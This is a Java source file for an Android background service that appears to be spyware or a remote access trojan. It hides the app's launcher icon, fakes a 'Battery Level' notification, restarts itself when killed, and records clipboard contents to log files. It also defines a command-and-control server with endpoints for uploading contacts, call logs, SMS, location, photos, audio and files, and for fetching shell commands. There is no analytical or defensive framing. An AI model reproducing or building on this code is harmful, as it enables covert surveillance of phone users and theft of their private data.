package oom.android.system.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DeviceAdminService;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.util.Log;
import android.view.ActionMode;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import oom.android.system.Managers.audioManager;
import oom.android.system.Managers.base;
import oom.android.system.Settings.TypeOpenFile;

public class MyService extends Service {

    static Context context;
    static Integer App_Version = 1;

    public final static String LOG_TAG = "myLogs";
    static String log_path;//полный путь до папки logs
    //mywebsutedlatest.000webhostapp.com http://www.test1.ru/
    final static String site = "http://mywebsutedlatest.000webhostapp.com";
    final static String Devices = site+"/Devices/"+DeviceID()+"/";

    final static String filelist_url = Devices +"getlist.php";//возращает список файлов на сервере
    final static String uploader_url = Devices +"up.php";//для загрузки файлов на сервер
    final static String cmd_url = Devices +"getc.php";//возращает команду из файла c.txt
    public final static String post_url = Devices +"output.php";//файл output или же status
    final static String online_url = Devices +"online.php";//сообщает о онлайне
    final static String shelltime_url = Devices +"time.php";//время использования комманды на сервере
    final static String CheckDevice = site +"CheckDevice.php";//время использования комманды на сервере

    final static String out_contacts = Devices +"info/Contacts/setconlist.php";
    final static String out_call = Devices +"info/Calls/setCalllist.php";
    final static String out_sms = Devices +"info/Sms/setsmslist.php";
    final static String out_block = Devices +"info/Block/setBlocklist.php";
    final static String out_fm = Devices +"info/FileManager/setFlist.php";
    final static String out_Loc = Devices +"info/Location/setLocation.php";
    final static String out_Cameras = Devices +"info/Camera/ListCameras/setCameras.php";
    final static String out_MediaF = Devices +"info/MediaStore/setMediaF.php";

    public final static String output_img = Devices+"Photo/oimg.php";

    public final static String output_audio = Devices+"Audio/oaudio.php";

    static Integer userid=1;//default 1
    static boolean admin=false;//default false
    static String fname;   // for recorder

    static boolean recording=false;//Запись диктофона
    static boolean record_must_be_stopped = false;//Запись может быть остановленна
    public static MediaRecorder recorder;
    static boolean cmdsessionactive=false;//активирован ли поток шелла
    static HandlerThread waiterthread;//поток для hiddenwaiter
    public static int battery_level=0,battery_status=0,charge_type=0;
    static boolean syncactive = false;//режим синхронизации

    static boolean ScreenOn = false;//режим включенного экрана

    DevicePolicyManager devicePolicyManager;
    ComponentName  deviceAdmin;

    public static Context getContext(){
        return context;
    }
    public void onCreate() {
        init();
        startwaiter();
    }

    @SuppressLint({"MissingPermission", "HardwareIds"})
    public static String DeviceID() {
        String devicIMEI;
        devicIMEI = Build.ID+ String.valueOf(VERSION.SDK_INT);

        return devicIMEI;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("");
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        context = this;
        return Service.START_STICKY;
    }

    public void onDestroy() {
        sendBroadcast(new Intent("oom.android.system.restart"));  //сделает не убиваемым если система выключается
    }

    @Override
    public void onStart(Intent intent, int startId) {
        devicePolicyManager = (DevicePolicyManager)getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            deviceAdmin = new ComponentName(this, DeviceAdminService.class);
        }
    }

    void init(){
        try{
            log_path=getApplicationContext().getFilesDir().getAbsolutePath()+"/logs";
            if(freespace()[0]<5L){  // 5 МБ свободного места минимум в порядке
                disable_recorder();
            }

            PackageManager pkg=this.getPackageManager();
            pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
                startMyOwnForeground();
            else
                startForeground(1, new Notification());

            clipBoard();

        }
        catch(Exception e){}
    }

    public void clipBoard(){
        ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            public void onPrimaryClipChanged() {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                if (clipboard.hasPrimaryClip()) {
                    ClipData clipData = clipboard.getPrimaryClip();
                    if (clipData.getItemCount() > 0) {
                        CharSequence text = clipData.getItemAt(0).getText();
                        if (text != null) {
                            try {
                                JSONObject data = new JSONObject();
                                data.put(base.CLIPBOARD.TEXT, text);
                                writeFile(TypeOpenFile.Clipboard,data.toString());
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
        };

        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground()
    {
        String NOTIFICATION_CHANNEL_ID = "example_permanence";
        String channelName = "Battery Level Service";
        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);

        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(chan);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Battery Level")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(1, notification);
    }


    void disable_recorder(){
        try{
            ComponentName component = new ComponentName(getApplicationContext(), audioManager.class);
            getPackageManager().setComponentEnabledSetting(component,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        }
        catch (Exception e){}
    }

    @SuppressWarnings("deprecation")
    @SuppressLint("NewApi")
    static long[] freespace(){
        StatFs statFs = new StatFs(Environment.getDataDirectory().getAbsolutePath());
        StatFs statFs2 = new StatFs(Environment.getExternalStorageDirectory().getAbsolutePath());
        long   data_free;
        long   ext_free;
        if(Integer.valueOf(VERSION.SDK_INT)>=18){
            data_free   = (statFs.getAvailableBlocksLong() * statFs.getBlockSizeLong())/1024/1024;
            ext_free   = (statFs2.getAvailableBlocksLong() * statFs2.getBlockSizeLong())/1024/1024;}
        else{
            data_free   = (statFs.getAvailableBlocks() * statFs.getBlockSize())/1024/1024;
            ext_free   = (statFs2.getAvailableBlocks() * statFs2.getBlockSize())/1024/1024;
        }

        return new long[] {data_free, ext_free};

    }


    void startwaiter(){
        HiddenWaiter evilreceiver = new HiddenWaiter();
        try{
            waiterthread = new HandlerThread("hiddenwaiterthread");
            waiterthread.start();
            Looper customlooper = waiterthread.getLooper();
            Handler waiterhandler = new Handler(customlooper);
            IntentFilter myfilter = new IntentFilter();
            myfilter.addAction("android.intent.action.TIME_SET");
            myfilter.addAction("android.intent.action.SCREEN_ON");
            myfilter.addAction("android.intent.action.SCREEN_OFF");

            try{
                registerReceiver(evilreceiver, myfilter,null,waiterhandler);
            }
            catch(ExceptionInInitializerError e){
                unregisterReceiver(evilreceiver);
            }
        }
        catch(Exception e){

        }

    }

    void stopwaiter(){
        //Intent intent = new Intent();
        //intent.setAction("stopmyreciever");
        //sendBroadcast(intent);
        HiddenWaiter evilreceiver = new HiddenWaiter();
        unregisterReceiver(evilreceiver);
        waiterthread.quit();
    }

    public static File OpenFile(int type){
        File dir = new File(getContext().getApplicationInfo().dataDir+"/files/logs");
        dir.mkdirs();

        SimpleDateFormat dateFormat = new SimpleDateFormat("dd_mm_yyyy_hh_mm_ss",
                Locale.getDefault());
        String ffile;
        if(type== TypeOpenFile.Record)//record
            ffile= "record_" + dateFormat.format(new Date()) +MyService.fname+ ".mpeg4";
        else if(type==TypeOpenFile.Video)//video
            ffile= "video_" + dateFormat.format(new Date()) + ".mp4";
        else if(type==TypeOpenFile.Photo)//picture
            ffile= "photo_" + dateFormat.format(new Date()) + ".jpg";
        else if(type==TypeOpenFile.Logger){
            dateFormat = new SimpleDateFormat("dd_MM_YYYY",Locale.getDefault());
            ffile= "logger" + dateFormat.format(new Date()) + ".json";
        }
        else if(type==TypeOpenFile.NotificationLogger){
            dateFormat = new SimpleDateFormat("dd_MM_YYYY",Locale.getDefault());
            ffile= "notifications" + dateFormat.format(new Date()) + ".json";
        }
        else if(type==TypeOpenFile.Clipboard){
            dateFormat = new SimpleDateFormat("dd_MM_YYYY hh:mm:ss",Locale.getDefault());
            ffile= "clipboards_" + dateFormat.format(new Date()) + ".json";
        }
        else if(type==TypeOpenFile.ScreenShot)
            ffile= "screenshot_" + dateFormat.format(new Date()) + ".png";
        else
            ffile = "unknown.txt";
        String filename = dir.getPath() + File.separator + ffile;
        File file = new File(filename);
        return file;
    }

    public static void writeFile(Integer typeOpenFile, String text){
        try {
            FileWriter writer;
            BufferedWriter bufferWriter;
            writer = new FileWriter(OpenFile(typeOpenFile).getAbsolutePath(), true);
            bufferWriter = new BufferedWriter(writer);
            bufferWriter.write(text);
            bufferWriter.close();
        } catch (IOException e) {
            FileOutputStream fos;
            try {
                File file = new File(OpenFile(typeOpenFile).getAbsolutePath());
                fos = new FileOutputStream(file);
                fos.write(text.getBytes());
                fos.flush();
                fos.close();
            } catch (FileNotFoundException ex) {
                ex.printStackTrace();
            } catch (IOException ex) {
                ex.printStackTrace();
            }

        }
    }
}
